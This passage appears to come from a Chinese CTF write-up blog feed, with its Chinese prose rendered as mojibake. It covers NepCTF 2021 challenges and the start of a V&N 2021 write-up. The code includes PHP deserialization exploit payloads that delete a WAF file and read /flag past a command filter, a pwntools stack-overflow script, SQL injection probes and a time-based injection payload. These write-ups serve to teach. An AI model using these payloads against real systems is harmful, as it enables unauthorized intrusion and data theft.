class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'php://filter/convert.base64-encode/resource=shell'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ç›®å½•ä¸‹å¿…é¡»æœ‰ shell.php waf.txt</span></span></code></pre><p>å¾—åˆ°payload</p><pre class="language-php" data-language="php"><code class="language-php">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NDk6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9c2hlbGwiO3M6NzoiY29udGVudCI7czowOiIiO30<span class="token operator">=</span></code></pre><img src="/article/Nepctf2021/image-20210322161745412.png" class="" title="image-20210322161745412" loading="lazy"><p>è¯»å–åˆ°<code>shell.php</code>å†…å®¹</p><pre class="language-php" data-language="php"><code class="language-php">// shell.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/'</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"NO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'so long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å°±æ˜¯ä¼ å…¥ä¸€ä¸ªå‘½ä»¤ï¼Œè¿‡æ»¤ä¸€å †è¯»å–å‡½æ•°ç„¶åé•¿åº¦è¦å°äº10å¹¶è¯»å–flagã€‚</p><p>ç¨åå†ç ”ç©¶ï¼Œé‚£ä¹ˆç°åœ¨çš„é—®é¢˜å°±æ˜¯è¿›shellå‡½æ•°ï¼Œç„¶è€Œè¿›shellå‡½æ•°å†™æ­»äº†å¿…é¡»è¦waf.txtä¸å­˜åœ¨ã€‚ä½†waf.txtæ˜¯æœ‰çš„</p><img src="/article/Nepctf2021/image-20210322162252803.png" class="" title="waf" loading="lazy"><p>è¿™å°±ä¸ºéš¾æˆ‘èƒ–è™äº†ï¼Œæ€è·¯è‡³æ­¤overäº†ã€‚</p><hr><h5 id="åˆ é™¤waf-txtï¼š"><a href="#åˆ é™¤waf-txtï¼š" class="headerlink" title="åˆ é™¤waf.txtï¼š"></a>åˆ é™¤waf.txtï¼š</h5><p>å¯»æ‰¾å¤§ä½¬åšå®¢æ–‡ç« ï¼Œæ‰¾åˆ°äº†æŒ‡å¼•æ€è·¯çš„<a href="https://blog.csdn.net/weixin_42444939/article/details/100781890">æ–‡ç« </a>ï¼Œ2019bytectfçš„ä¸€é“webé¢˜EzCMSï¼ŒåŸé¢˜è¦åˆ é™¤/è¦†ç›–ç›®å½•ä¸‹<code>.hatccess</code>ï¼Œåˆšå¥½æœ¬é¢˜çš„loginç±»æœ‰æ¼æ´å¯å¯»ï¼Œphpæ‰‹å†Œé‡ŒæŸ¥æ‰¾opençš„åŒåå‡½æ•°ï¼Œåˆ©ç”¨<a href="https://www.php.net/manual/zh/ziparchive.open.php">ZipArchive::open</a>ï¼Œå…¶ç¬¬äºŒä¸ªå‚æ•°é‡Œå­˜åœ¨èƒ½è¦†ç›–æŒ‡å®šæ–‡ä»¶çš„æ¨¡å¼ï¼Œç›´æ¥åˆ æ‰<code>waf.txt</code></p><p>äºæ˜¯å‡†å¤‡å¥½äº†pharæ–‡ä»¶å‡†å¤‡â€˜è¿œç¨‹pharâ€™ååºåˆ—åŒ–ï¼Œä½†æ˜¯pharä¼ªåè®®æ˜¯ä¸å¯ä»¥è¿œç¨‹çš„</p><img src="/article/Nepctf2021/image-20210322163503746.png" class="" title="phar" loading="lazy"><p>å­©å­æ¯”è¾ƒå‘†ï¼Œæµ‹äº†æœ‰ä¸€ä¼šã€‚è¿™é‡Œå—åˆ°äº†é‚£é¢˜å›ºæœ‰æ€ç»´çš„å½±å“ï¼Œå…¶å®å¹¶ä¸éœ€è¦æ‰“pharååºåˆ—åŒ–çš„ï¼Œç”±loginç±»ä¸­checkingå‡½æ•°<code>$this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content)</code>ï¼Œç›´æ¥ä»¤Gameç±»çš„file newä¸€ä¸ªZipArchive()ï¼Œfilenameå³ä¸ºwaf.txtï¼Œcontentä¸ºæ¨¡å¼<code>ZipArchive::OVERWRITE | ZipArchive::CREATE</code>ï¼Œä¹Ÿå°±æ˜¯9</p><img src="/article/Nepctf2021/image-20210322164126786.png" class="" title="type" loading="lazy"><p>æµ‹è¯•å¦‚ä¸‹</p><img src="/article/Nepctf2021/image-20210322164402187.png" class="" title="del" loading="lazy"><p>å¯è§waf.txtæˆåŠŸè¢«åˆ é™¤ï¼Œexp2å¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token single-quoted-string string">''</span><span class="token single-quoted-string string">'ç±»åŒä¸Š    '</span><span class="token single-quoted-string string">''</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">OVERWRITE</span> <span class="token operator">|</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CREATE</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å¾—åˆ°payload</p><pre class="language-none"><code class="language-none">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo5O30&#x3D;</code></pre><p>æˆåŠŸåˆ é™¤waf.txt</p><img src="/article/Nepctf2021/image-20210322171241326.png" class="" title="delwaf" loading="lazy"><hr><h5 id="è¯»å–flagï¼š"><a href="#è¯»å–flagï¼š" class="headerlink" title="è¯»å–flagï¼š"></a>è¯»å–flagï¼š</h5><p>lsæ²¡è¿‡æ»¤ï¼Œæœ‰å…´è¶£å¯ä»¥æ‰§è¡Œlsçœ‹ä¸€çœ¼ï¼Œflagåœ¨æ ¹ç›®å½•ä¸‹</p><p>æœ€åä¸€æ­¥ï¼Œåˆ†æshell.phpï¼Œå¦‚ä½•åœ¨è¿‡æ»¤çš„æƒ…å†µä¸‹è¯»å–/flagï¼Œæœä¸€åœˆï¼Œæ‰¾åˆ°äº†linuxçš„å‘½ä»¤<code>pr</code></p><blockquote><p><strong>prå‘½ä»¤</strong> ç”¨æ¥å°†æ–‡æœ¬æ–‡ä»¶è½¬æ¢æˆé€‚åˆæ‰“å°çš„æ ¼å¼ï¼Œå®ƒå¯ä»¥æŠŠè¾ƒå¤§çš„æ–‡ä»¶åˆ†å‰²æˆå¤šä¸ªé¡µé¢è¿›è¡Œæ‰“å°ï¼Œå¹¶ä¸ºæ¯ä¸ªé¡µé¢æ·»åŠ æ ‡é¢˜ã€‚</p></blockquote><img src="/article/Nepctf2021/image-20210322171800805.png" class="" title="pr" loading="lazy"><p>exp3å¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token single-quoted-string string">''</span><span class="token single-quoted-string string">'  ç±»åŒä¸Š  '</span><span class="token single-quoted-string string">''</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'pr /flag'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å¾—åˆ°payload</p><pre class="language-none"><code class="language-none">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6Nzoid2FmLnR4dCI7czo3OiJjb250ZW50IjtzOjg6InByIC9mbGFnIjt9</code></pre><p>æ‹¿åˆ°flag</p><img src="/article/Nepctf2021/image-20210322173545249.png" class="" title="flag" loading="lazy"><p>è®°å½•ä¸€ä¸‹ï¼Œè·å–ç±»å‡½æ•°åçš„æ–¹æ³•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$methods</span> <span class="token keyword">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token single-quoted-string string">'__destruct'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'__wakeup'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'__call'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'__callStatic'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'open'</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">print</span> <span class="token variable">$class</span> <span class="token class-name"><span class="token punctuation">.</span></span> <span class="token single-quoted-string string">'::'</span> <span class="token punctuation">.</span> <span class="token variable">$method</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="xhh"><a href="#xhh" class="headerlink" title="xhh"></a>xhh</h3><img src="/article/Nepctf2021/20210322132920.png" class="" width="20210322132920" loading="lazy"><p>æ ˆæº¢å‡ºï¼Œå¡«å……0x10ï¼Œç„¶åæ‰¾åˆ°system cat flagå‡½æ•°ï¼Œæ®åœ°å€éšæœºåŒ–åå­—èŠ‚ä¸å˜ï¼Œå°ç«¯æ›´æ”¹åœ°å€ï¼Œå½“å›¾ç‰‡åˆ·åˆ°å°èŒèšªçš„å›¾æ¡ˆä¾¿getshell</p><p>exp:</p><pre class="language-none"><code class="language-none">from pwn import *context.arch &#x3D; &#39;amd64&#39;context.log_level&#x3D;&#39;debug&#39;#p &#x3D; process(&#39;.&#x2F;xhh&#39;)p &#x3D; remote(&#39;node2.hackingfor.fun&#39;,35402 )#p &#x3D; remote(&#39;127.0.0.1&#39;,12345)payload &#x3D; p64(0) + p64(1) + b&quot;\xE1&quot;p.send(payload)p.interactive()</code></pre><hr><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="hardcsharp"><a href="#hardcsharp" class="headerlink" title="hardcsharp"></a>hardcsharp</h3><pre class="language-c#" data-language="c#"><code class="language-c#">private static void Main(string[] args)&#123;    AesClass class2 &#x3D; new AesClass();    string key &#x3D; &quot;&quot;;    string strB &#x3D; &quot;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH&#x2F;3Wh0&quot;;    byte[] buffer &#x3D; new byte[] &#123;         0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12    &#125;;    Console.WriteLine(&quot;Welcome to nepnep csharp test! plz input the magical code:&quot;);    string str &#x3D; Console.ReadLine();    if (str.Length !&#x3D; 0x25)    &#123;        Console.WriteLine(&quot;Nope!&quot;);        Console.ReadKey();    &#125;    else if ((str.Substring(0, 4) !&#x3D; &quot;Nep&#123;&quot;) || (str[0x24] !&#x3D; &#39;&#125;&#39;))    &#123;        Console.WriteLine(&quot;Nope!&quot;);        Console.ReadKey();    &#125;    else    &#123;        for (int i &#x3D; 0; i &lt; 0x20; i++)        &#123;            key &#x3D; key + Convert.ToChar((int) (buffer[i] ^ 0x33)).ToString();        &#125;        if (string.Compare(class2.AesEncrypt(str, key), strB) &#x3D;&#x3D; 0)        &#123;            Console.WriteLine(&quot;wow, you pass it!&quot;);            Console.ReadKey();        &#125;        else        &#123;            Console.WriteLine(&quot;Nope!&quot;);            Console.ReadKey();        &#125;    &#125;&#125;</code></pre><p>åç¼–è¯‘å‡ºc#ä»£ç </p><p>å†™expï¼š</p><pre class="language-none"><code class="language-none">a &#x3D; [0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12]for i in range(len(a)):    print(chr(a[i] ^ 0x33),end&#x3D;&quot;&quot;)</code></pre><pre class="language-none"><code class="language-none">Î» python3 test.pybadbadwomen!!!!!!!!!!!!!!!!!!!!!</code></pre><p>AesåŠ å¯†ç½‘ç«™ä¸€æ³¢ï¼š</p><img src="/article/Nepctf2021/20210322133852.png" class="" width="20210322133852" loading="lazy"><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¾ˆæœ‰æ”¶è·ï¼Œå°¤å…¶æ˜¯ã€Šç®€å•çš„phpååºåˆ—åŒ–ã€‹ï¼Œåˆå­¦åˆ°ä¸€ä¸ªæ–°å§¿åŠ¿ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V&amp;N2021å…¬å¼€èµ›</title>
      <link href="article/VN2021ctf/"/>
      <url>article/VN2021ctf/</url>
      
        <content type="html"><![CDATA[<p>æ¯”èµ›æ˜µç§°ï¼šåˆ«ç­”äº†åˆ«ç­”äº†å†ç­”äººå‚»äº†</p><a id="more"></a><p>æ¯”èµ›æƒ…å†µï¼š</p><img src="/article/VN2021ctf/image-20210315121953685.png" class="" title="image-20210315121953685" loading="lazy"><p>å­©å­å¤ªèœäº†ï¼Œåé¢å®åœ¨ä¸ä¼šåšäº†â€¦</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h3><p>å°æ¸¸æˆé¢˜ä¸Šæ¥å°±æ”¹js</p><img src="/article/VN2021ctf/image-20210315122233099.png" class="" title="image-20210315122233099" loading="lazy"><p>å‘ç°æ¸¸æˆå…³é”®å‡½æ•°ï¼Œç›´æ¥æ”¹æ•°æ®ç„¶å<code>Init()</code>,æœ€å¥½ç–¯ç‹‚<code>NextLevel()</code>è·³åˆ°ç¬¬10å…³</p><img src="/article/VN2021ctf/image-20210315122433276.png" class="" title="image-20210315122433276" loading="lazy"><p>ç›´æ¥ä»ç¬¬åå…³å¼€å§‹ï¼Œä¸Šå»æ’¸bossï¼Œå‡ºflag</p><img src="/article/VN2021ctf/image-20210315122540586.png" class="" title="image-20210315122540586" loading="lazy"><p>ä¹Ÿå¯ä»¥æœ¬åœ°ä¿å­˜ï¼Œç›´æ¥ç®—jsçš„flagï¼Œæˆ–è€…å¼€godæ¨¡å¼.<img src="/article/VN2021ctf/image-20210315122714928.png" class="" title="image-20210315122714928" loading="lazy"></p><p>å†ä¸è¡Œâ€¦åé¢è¿˜å‘ç°äº†ä¸ªå‡½æ•°â€¦<code>boss.Kill()</code></p><hr><h3 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h3><p>hintï¼šæˆ‘çš„ä»£ç ä¸èƒ½æ³¨å…¥å§</p><img src="/article/VN2021ctf/image-20210315122917856.png" class="" title="image-20210315122917856" loading="lazy"><p>æ‰“å¼€ç™»é™†ç•Œé¢ï¼Œç¬¬ä¸€ååº”æ³¨å…¥ï¼Œå†·é™ä¸‹çœ‹æ•°æ®é‡å¾ˆå°‘ï¼Œæ‹¿å‡ºç¥–ä¼ 20wå­—å…¸çˆ†ç ´ã€‚</p><p>å†å†·é™ä¸‹æµ‹è¯•ä¸€ä¸‹ï¼Œç¡®è®¤æ˜¯sqlæ³¨å…¥</p><pre class="language-none"><code class="language-none">username&#x3D;\&amp;password&#x3D;or 1&#x3D;1# Â·ä¸æŠ¥é”™username&#x3D;\&amp;password&#x3D;&#39; Â·æŠ¥é”™username&#x3D;\&amp;password&#x3D;&#39;&#39; Â·ä¸æŠ¥é”™username&#x3D;\&amp;password&#x3D;&#39;# Â·ä¸æŠ¥é”™username&#x3D;\&amp;password&#x3D;&#39;or 1&#x3D;0# Â·ä¸æŠ¥é”™username&#x3D;\&amp;password&#x3D;&#39;or # Â·500æŠ¥é”™username&#x3D;\&amp;password&#x3D;&#39;and if(1,sleep(10),select 1)# Â·ä¸æŠ¥é”™æ— å»¶æ—¶username&#x3D;admin&amp;password&#x3D;&#39;and if(0,sleep(10),select 1)# Â·ä¸æŠ¥é”™æ— å»¶æ—¶å‘ç°æ²¡å•¥ç”¨...</code></pre><p>æ¨æµ‹åç«¯ä¸ºï¼š<code>select * from user where username=&#39;$username&#39; and password=&#39;$password&#39;</code></p><p>è¿‡æ»¤äº†sleep()å¯èƒ½</p><p>è¿™é‡Œæ²¡å›æ˜¾çš„å°±å»¶æ—¶æ³¨å…¥ï¼Œ<code>sleep()</code>,<code>Benchmark()</code>,æˆ–è€…ç¬›å¡å°”ç§¯</p><h4 id="ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥"><a href="#ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥" class="headerlink" title="ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥"></a>ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥</h4><p>å½“ç„¶å»¶æ—¶ä¸ç²¾ç¡®ï¼Œcount(*)æ•°é‡å¤§æ—¶ï¼Œè´¹æ—¶å°±é«˜ï¼Œä½•å†µæ¯”èµ›æœºå­<strong>æå…¶ä¸ç¨³å®š</strong>ï¼Œä¸æ¸…æ¥šæ˜¯æˆ‘å¡äº†è¿˜æ˜¯æœºå™¨å¡äº†ã€‚</p><blockquote><p>ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥</p><p>count(*)åé¢æ‰€æœ‰è¡¨ä¸­çš„åˆ—ç¬›å¡å°”ç§¯æ•°ï¼Œæ•°é‡è¶Šå¤šè¶Šå¡ï¼Œå°±ä¼šæœ‰å»¶è¿Ÿï¼Œç±»ä¼¼ä¹‹å‰æŸæ¯”èµ›pgsqlçš„å»¶æ—¶æ³¨å…¥ä¹Ÿå¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰“æ—¶é—´å·®ï¼Œä»è€Œè¾¾åˆ°å»¶æ—¶æ³¨å…¥çš„æ•ˆæœ</p><p>å‚è€ƒä¹‹å‰çš„WPï¼š<a href="/article/cqb2021">æ˜¥ç§‹æ¯2021æ–°æ˜¥æ¬¢ä¹èµ›ä¸€é“é¢˜â€”â€”æŒ‰Fæ³¨å…¥ å¯¹pgsqlçš„ç ”ç©¶</a></p><pre class="language-none"><code class="language-none">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;+-----------+| count(*)  |+-----------+| 113101560 |+-----------+1 row in set (2.07 sec)mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);+------+-----+| user | pwd |+------+-----+| 1    | 0   |+------+-----+1 row in set (2.08 sec)</code></pre></blockquote><p>ç”šè‡³æ•°é‡å¤§äº†æŠŠæˆ‘æ•°æ®åº“ç»™è·‘å´©äº†â€¦</p><img src="/article/VN2021ctf/image-20210315142653488.png" class="" title="image-20210315142653488" loading="lazy"><p>payloadï¼š</p><pre class="language-none"><code class="language-none">-1&#39;and if(&#96;payload&#96;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#</code></pre><p>è„šæœ¬ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3æœˆ 14, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> randomurl <span class="token operator">=</span> <span class="token string">"http://&#123;&#125;.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login"</span><span class="token comment"># &#123;&#125;ç”±äºå¼€äº†å¤šä¸ªé¶æœºï¼Œæ¯æ¬¡éšæœºè®¿é—®æŸä¸ªé¶æœºï¼Œå¯ä»¥å‡å°‘å†²çªå¯èƒ½</span><span class="token keyword">def</span> 